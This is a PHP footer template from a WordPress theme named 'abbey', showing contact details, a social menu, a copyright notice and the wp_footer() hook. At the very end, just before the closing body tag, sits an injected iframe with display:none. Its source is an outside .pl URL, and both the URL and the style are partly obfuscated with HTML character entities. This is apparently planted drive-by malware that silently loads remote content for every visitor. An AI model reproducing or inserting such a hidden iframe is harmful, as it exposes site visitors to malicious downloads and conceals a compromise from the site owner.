<?php

$site_about = ( !empty( abbey_get_defaults( "about" ) ) ) ? abbey_get_defaults( "about" ) : "";

?>
		
		<footer id="site-footer" role="footer" class="row">	
			<aside class="row" id="before-footer"> <?php do_action( "abbey_theme_before_footer" ) ; ?></aside> 
			<section id="inner-footer" class="row">
				<aside class="col-md-3" id="site-info">
						<div class="text-center"><?php abbey_show_logo( "", "", false ); ?> 
						<p class="small description"> <?php bloginfo( "description" ); ?> </p>
					</div>
					<address> 
						<span class="text-capitalize"><?php _e( "Visit us:", "abbey" ); ?> </span>
						<?php echo esc_html( abbey_get_contact( "address", "office" ) ) ; ?>. <br />
						<span class="text-capitalize"><?php _e( "or Call:", "abbey" ); ?></span>
						<?php echo esc_html( implode( abbey_get_contact( "tel" ), " , " ) ); ?>. <br/>
						<span class="text-capitalize"><?php _e( "Email:", "abbey" ); ?></span>
						<?php echo esc_html( implode( abbey_get_contact( "email" ), " , " ) ); ?>.
					</address>
				</aside>
				<aside class="col-md-3">
				</aside>
				<aside class="col-md-3">
					<h4><?php _e( "Connect with us on social media", "abbey"); ?> </h4>
					<?php abbey_social_menu(); ?>
				</aside>
				
				<div class="md-50 text-center">
					<p class="disclaimer small"><?php echo apply_filters( "abbey_theme_footer_disclaimer", 
											__( "* All publications, articles, reviews published on this website should not be redistributed, republished or printed without our authorised consent", "abbey" 
											) 
									); ?>
					</p>
					<?php echo sprintf(__( "All rights reserved &copy; %s", "abbey" ), date("Y") ); ?>
				</div>
			</section>
				
				<div id="footer-bottom" class="row">
					
					<div class="">
						<?php do_action( "abbey_theme_footer_credits" ); ?>
					</div>
				</div>
			

		</footer>

	
</div><!--#site wrapper open in header.php -->
	<?php wp_footer(); ?>

<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
</body>
</html>